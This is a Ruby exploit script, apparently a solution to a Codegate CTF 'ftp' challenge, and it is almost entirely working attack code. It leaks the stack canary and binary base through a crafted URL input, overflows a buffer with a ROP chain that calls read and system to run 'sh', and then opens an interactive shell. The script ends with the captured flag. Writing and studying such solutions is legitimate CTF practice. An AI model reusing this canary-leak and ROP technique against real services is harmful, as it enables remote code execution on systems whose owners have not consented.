#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]
host, port = 'ch41l3ng3s.codegate.kr', 2121
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'ftp'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

#---------------------------
# sucess probability: 1/256
#---------------------------

def write_i(i)
  z.write i.p32
end

def pt
  z.gets('Choice')
end
pt
if @local and false # true
  if h.canary.p32[1].include?('/')
    (p '>>>>>>>' ; STDIN.gets) 
  else
    exit 1
  end
end

write_i(1)
z.puts 'name'
z.puts '100'
z.puts 'id'
z.puts 'pass'
write_i(3)
z.puts 'admin'
z.puts 'P3ssw0rd'

def dodo(str)
  write_i(7)
  write_i(8)
  write_i(1)
  # write_i(5)
  z.gets "URL:\n"
  # STDIN.gets
  z.puts str
  context.local(log_level: :debug) do
    str = z.recvuntil('Choice', drop: true)
    str = str[1..-1] if str[0] == "\n"
    str = str[0, 7].reverse
    log.info str.inspect
    exit 1 if str.size < 7
    @canary = ("\x00" + str[0, 3]).u32
    @elf_base = str[3, 4].u32 - 0x8ef8
  end
end

write_i(7)
write_i(8)
write_i(1)
z.gets "URL:\n"
z.puts 'A' * 60
dodo('/../')

# @canary = h.canary
# @elf_base = h.elf.base

canary = @canary
write_i(3)
buf = @elf_base + 0x9830
cmd = "sh;"
z.write('A' * 200 + flat(canary,
                         @elf_base + 0x8ef8, 0, 0,
                         @elf_base + 0x12c0, # plt.read
                         @elf_base + 0x12a8, # plt.system
                         0, buf, cmd.size,
                         "\n"))
z.gets('pw')
z.puts("pass")
sleep(0.1)
z.write cmd
z.interact

# flag: Sorry_ftp_1s_brok3n_T_T@
